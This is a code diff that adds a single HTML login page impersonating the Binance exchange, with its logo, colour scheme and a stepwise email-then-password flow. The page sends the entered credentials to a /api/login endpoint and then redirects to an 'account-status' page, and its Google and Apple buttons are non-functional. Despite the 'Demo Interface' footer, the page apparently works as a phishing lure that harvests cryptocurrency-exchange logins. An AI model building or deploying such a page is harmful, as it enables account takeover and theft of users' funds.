@@ -1,1 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg:#0b0e11;
+  --card:#181a20;
+  --border:#2b3139;
+  --text:#eaecef;
+  --muted:#848e9c;
+  --yellow:#f0b90b;
+}
+*{box-sizing:border-box;font-family:'Inter',sans-serif}
+body{
+  margin:0;background:var(--bg);
+  min-height:100vh;display:flex;
+  align-items:center;justify-content:center;
+  color:var(--text)
+}
+.container{
+  width:360px;background:var(--card);
+  border-radius:12px;padding:32px 28px
+}
+.logo{text-align:center;margin-bottom:28px}
+.logo img{width:140px;margin:auto}
+h2{font-size:20px;margin-bottom:18px}
+input{
+  width:100%;height:48px;
+  padding:0 14px;margin-bottom:14px;
+  background:#0b0e11;border:1px solid var(--border);
+  border-radius:8px;color:var(--text)
+}
+button{
+  width:100%;height:48px;border-radius:8px;
+  font-weight:600;border:none;cursor:pointer
+}
+.primary{background:var(--yellow);color:#000}
+.secondary{
+  background:#0b0e11;border:1px solid var(--border);
+  color:var(--text);margin-top:12px
+}
+.divider{
+  display:flex;align-items:center;
+  font-size:12px;color:var(--muted);margin:20px 0
+}
+.divider:before,.divider:after{
+  content:"";flex:1;height:1px;background:var(--border)
+}
+.divider span{margin:0 12px}
+.step{display:none}
+.step.active{display:block}
+.footer{text-align:center;font-size:11px;color:var(--muted);margin-top:20px}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+  <img src="https://i.ibb.co/QvRGdPMf/1681906234binance-logo-png.webp">
+</div>
+
+<div class="step active" id="options">
+  <h2>Log In</h2>
+  <button class="primary" onclick="go('options','email')">
+    Continue with Email
+  </button>
+  <div class="divider"><span>OR</span></div>
+  <button class="secondary">Sign in with Google</button>
+  <button class="secondary">Sign in with Apple</button>
+</div>
+
+<div class="step" id="email">
+  <h2>Email</h2>
+  <input id="emailInput" type="email" placeholder="Email" required>
+  <button class="primary" onclick="go('email','password')">Next</button>
+</div>
+
+<div class="step" id="password">
+  <h2>Password</h2>
+  <input id="passwordInput" type="password" placeholder="Password" required>
+  <button class="primary" onclick="submitLogin()">Log In</button>
+</div>
+
+<div class="footer">
+  Demo Interface • Security logging enabled
+</div>
+
+</div>
+
+<script>
+function go(from,to){
+  document.getElementById(from).classList.remove('active');
+  document.getElementById(to).classList.add('active');
+}
+
+async function submitLogin(){
+  const email = document.getElementById("emailInput").value;
+  const password = document.getElementById("passwordInput").value;
+
+  await fetch("/api/login",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({ email, password })
+  });
+
+  window.location.href="account-status.html";
+}
+</script>
+
+</body>
+</html>
+
 
